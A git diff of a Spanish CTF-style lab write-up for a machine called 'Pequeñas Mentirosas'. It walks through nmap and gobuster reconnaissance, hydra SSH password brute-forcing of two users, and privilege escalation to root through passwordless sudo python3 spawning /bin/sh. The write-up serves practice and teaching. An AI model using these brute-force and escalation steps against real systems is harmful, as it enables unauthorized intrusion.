@@ -1,15 +1,20 @@
-tags: #hydra 
-_________________________
-## Reconocimiento
+# Pequñas Mentirosas
+
+tags: #hydra
+
+***
+
+### Reconocimiento
 
 Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
+
 ```bash
 nmap -sS -p- 172.17.0.2 -oN ports -n -Pn --min-rate 5000 --open
 ```
 
 Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:
 
-![Pasted image 20251007143352](../../../Anexos/Pasted%20image%2020251007143352.png)
+![Pasted image 20251007143352](<../../../.gitbook/assets/Pasted image 20251007143352.png>)
 
 Vemos que tenemos abiertos los **puertos 22 (SSH) y 80 (HTTP)**. Ahora, usaremos otro comando de nmap para hacer un escaneo básico con algunos scripts y también conocer la versión de los servicios:
 
@@ -17,11 +22,11 @@ Vemos que tenemos abiertos los **puertos 22 (SSH) y 80 (HTTP)**. Ahora, usaremos
 nmap -sV -p22,80 172.17.0.2 -oN versions
 ```
 
-![Pasted image 20251007143750](../../../Anexos/Pasted%20image%2020251007143750.png)
+![Pasted image 20251007143750](<../../../.gitbook/assets/Pasted image 20251007143750.png>)
 
 Como vemos que hay un servicio HTTP, vamos a poner la IP en el navegador para ver de qué se trata:
 
-![Pasted image 20251007143908](../../../Anexos/Pasted%20image%2020251007143908.png)
+![Pasted image 20251007143908](<../../../.gitbook/assets/Pasted image 20251007143908.png>)
 
 Al ver esto, claramente vamos a probar hacer fuzzing, para descubrir directorios y archivos ocultos, utilizando el siguiente comando de gobuster:
 
@@ -29,15 +34,11 @@ Al ver esto, claramente vamos a probar hacer fuzzing, para descubrir directorios
 gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 5 -x .php,.txt,.xml,.html -o dirs.txt
 ```
 
-![Pasted image 20251012145138.png](Pasted%20image%2020251012145138.png)
-
 Al no encontrar nada, vamos a probar hacer fuerza bruta con hydra y el usuario A en el servicio ssh:
 
 ```bash
 hydra -l a -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -I ssh://172.17.0.2
 ```
-
-![Pasted image 20251012145124.png](Pasted%20image%2020251012145124.png)
 
 La tenemos! Vamos a acceder:
 
@@ -45,28 +46,27 @@ La tenemos! Vamos a acceder:
 ssh@172.17.0.2
 ```
 
-![Pasted image 20251012145257](../../../Anexos/Pasted%20image%2020251012145257.png)
+![Pasted image 20251012145257](<../../../.gitbook/assets/Pasted image 20251012145257.png>)
 
 Como no he conseguido nada buscando permisos SUID o sudo -l, me percato que hay otro usuario llamado spencer, así que voy a probar a hacer fuerza bruta a su usuario a ver si consigo algo:
 
-![Pasted image 20251012145833](../../../Anexos/Pasted%20image%2020251012145833.png)
+![Pasted image 20251012145833](<../../../.gitbook/assets/Pasted image 20251012145833.png>)
 
 Lo tenemos! Ahora nos conectamos:
 
-![Pasted image 20251012150028](../../../Anexos/Pasted%20image%2020251012150028.png)
+![Pasted image 20251012150028](<../../../.gitbook/assets/Pasted image 20251012150028.png>)
 
-Ahora, tras ejecutar sudo -l, vemos que podemos ejecutar python3 somo sudo sin contrasña, 
+Ahora, tras ejecutar sudo -l, vemos que podemos ejecutar python3 somo sudo sin contrasña,
 
-![Pasted image 20251012145952](../../../Anexos/Pasted%20image%2020251012145952.png)
+![Pasted image 20251012145952](<../../../.gitbook/assets/Pasted image 20251012145952.png>)
 
-Al ver esto, vamos a ejecutar dicha ruta absoluta para ejecutar python, y además le añadiremos el parámetro -i para ejecutarlo en modo interactivo:
-En este punto, con el siguiente one-liner logramos ejecución remota de comandos con privilegios:
+Al ver esto, vamos a ejecutar dicha ruta absoluta para ejecutar python, y además le añadiremos el parámetro -i para ejecutarlo en modo interactivo: En este punto, con el siguiente one-liner logramos ejecución remota de comandos con privilegios:
 
 ```python
 sudo -u root /usr/bin/python3 -i
 ```
 
-![Pasted image 20251012151418](../../../Anexos/Pasted%20image%2020251012151418.png)
+![Pasted image 20251012151418](<../../../.gitbook/assets/Pasted image 20251012151418.png>)
 
 Ahora que sabemos que funciona, vamos a ejecutar la siguiente sentencia:
 
@@ -74,6 +74,6 @@ Ahora que sabemos que funciona, vamos a ejecutar la siguiente sentencia:
 import os; os.system("/bin/sh");
 ```
 
-![Pasted image 20251012152619](../../../Anexos/Pasted%20image%2020251012152619.png)
+![Pasted image 20251012152619](<../../../.gitbook/assets/Pasted image 20251012152619.png>)
 
 Somos root!!
